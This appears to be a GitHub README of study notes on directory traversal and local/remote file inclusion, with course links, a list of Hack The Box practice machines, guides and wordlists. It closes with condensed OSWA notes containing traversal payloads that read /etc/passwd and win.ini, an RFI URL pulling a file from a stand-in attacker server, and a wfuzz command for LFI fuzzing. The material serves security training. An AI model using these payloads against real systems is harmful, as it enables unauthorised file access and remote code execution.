![image](https://github.com/user-attachments/assets/9ca23281-ecee-452f-86de-79fff53cd728)

# Directory Traversal

## Training Resources
---

### Courses

*Free*
- [PortSwigger Academy - Path Traversal](https://portswigger.net/web-security/file-path-traversal)

*Paid*
- [HTB - File Inlusion](https://academy.hackthebox.com/course/preview/file-inclusion)
- [THM - File Inclusion](https://tryhackme.com/r/room/fileinc)
- [THM - File Inclusion, Path Traversal](https://tryhackme.com/r/room/filepathtraversal)

#

### Hack The Box Machines
*These machines are tagged as containing Directory Traversal/LFI/RFI by HTB, the difficulty refers to the box as a whole and not necessarily the Directory Traversal/LFI/RFI element.*

| Machine Name | Difficulty | Completed |
| -- | -- | -- |
| GetLab | Very Easy | |
| Archive | Easy | |
| Trick | Easy | |
| Topology | Easy | |
| Bagel | Easy | |
| Backdoor | Easy | |
| Tabby | Easy | |
| Bookworm | Easy | |
| BigHead | Easy | |
| Stocker | Easy | |
| Mailing | Easy | |
| Llama | Easy | |
| LaCasaDePapel | Easy | |
| Laboratory | Easy | |
| Inject | Easy | |
| Haystack | Easy | |
| GreenHorn | Easy | |
| Gem | Easy | |
| FriendZone | Easy | |
| ServMon | Easy | |
| Repetitive | Easy | |
| Pilgrimage | Easy | |
| Paper | Easy | |
| OpenSource | Easy | |
| OpenAdmin | Easy | |
| Poison | Medium | |
| OnlyForYou | Medium | |
| Nineveh | Medium | |
| Format | Medium | |
| Resource | Medium | |
| Faculty | Medium | |
| Encoding | Medium | |
| Sniper | Medium | |
| StreamIO | Medium | |
| Devzat | Medium | |
| DevOps | Medium | |
| CrimeStoppers | Medium | |
| Cerberus | Medium | |
| Beep | Medium | |
| Awkward | Medium | |
| Ambassador | Medium | |
| Writer | Medium | |
| Zipping | Medium | |
| Waldo | Medium | |
| UpDown | Medium | |
| Unicode | Medium | |
| Unattended | Medium | |
| Timing | Medium | |
| TartarSauce | Medium | |
| Ghoul | Hard | |
| Flight | Hard | |
| BroScience | Hard | |
| Clicker | Hard | |
| Cybermonday | Hard | |
| EarlyAccess | Hard | |
| Download | Hard | |
| ForwardSlash | Hard | |
| FormulaX | Hard | |
| Intuition | Hard | |
| Monitors | Hard | |
| Moderators | Hard | |
| OverGraph | Hard | |
| Player | Hard | |
| Pikaboo | Hard | |
| Patents | Hard | |
| Reel2 | Hard | |
| RE | Hard | |
| Proper | Hard | |
| Pollution | Hard | |
| Seventeen | Hard | |
| Spooktrol | Hard | |
| Snoopy | Hard | |
| Smasher | Insane | |
| Response | Insane | |
| PikaTwoo | Insane | |
| Fingerprint | Insane | |
| Fatty | Insane | |
| Blunder | Insane | |
| Breadcrumbs | Insane | |

### Other Resources
---
**PT Guides**
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [Sushant OSCP Guide - LFI](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)
- [Sushant OSCP Guide - RFI](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)
- [My Guide Path Manipulation](https://tom23rose.gitbook.io/testingmethodology/web-testing/exploitation/path-manipulation)
- [The Hacker Recipes - Directory Traversal](https://www.thehacker.recipes/web/inputs/directory-traversal#%F0%9F%9B%A0%EF%B8%8F-directory-traversal)
- [The Hacker Recipes - File Inclusion](https://www.thehacker.recipes/web/inputs/file-inclusion/#file-inclusion)
- [The Hacker Recipes - Directory Fuzzing](https://www.thehacker.recipes/web/recon/directory-fuzzing#directory-fuzzing) - Could be useful
#
**Bug Bounty Write Ups**
- [Collection of LFI WriteUps](https://github.com/alexbieber/Bug_Bounty_writeups#local-file-inclusion-lfi)
#
**Methodologies**
- [OWASP Methodology - Directory Traversal FIle Include](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)
- [OWASP Wiki - LFI](https://wiki.owasp.org/index.php/Testing_for_Local_File_Inclusion)
#
**Wordlists**
- [PATT - Collection of LFI Wordlist]([https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/JHADDIX_LFI.txt](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI))
- [PATT - Linux Files of Interest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt)
- [PATT - Windows Files of Interest](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/LFI-WindowsFileCheck.txt)
#

## Condensed Notes
This is a condensed version of the notes I used during OSWA and are by no means complete. Make your own notes and methodology, building off these basic steps. 

Firstly some definitions related to "Path Manipulation" vulnerabilities:
**Directory Listing:** The ability to view directories you shouldn't have access to.
**Directory Traversal (Path Traversal):** The ability to view files in directories you shouldn't have access to. 
**Local File Inclusion:** The ability to execute a file on the target system that you shouldn't be able to or have access to. 
**Remote File Inclusion:** The ability to get the target to execute a file from a remote location, eg. a malicious attack server.

- Look for suggestive parameters hinting at interactions with a file:
```bash
https://insecure-website.com/loadImage?filename=123.png
```
- Try to access files locally (LFI).
```bash
# Linux
https://insecure-website.com/loadImage?filename=../../../etc/passwd

# Windows
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```
- Try to access remote files (RFI) - With server set up on your attack machine.
```bash
http://example.com/index.php?filename=http://attack-server.com/welcome.php
```
- Try encoding the payloads.
- Use automated tools such as Wfuzz:
```bash
wfuzz -c --hh <normal-reponse-size> --hc 404 -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://example/file.php?path=FUZZ
```
- Burp Suite Scans will attempt to discover this type of vulnerability. 
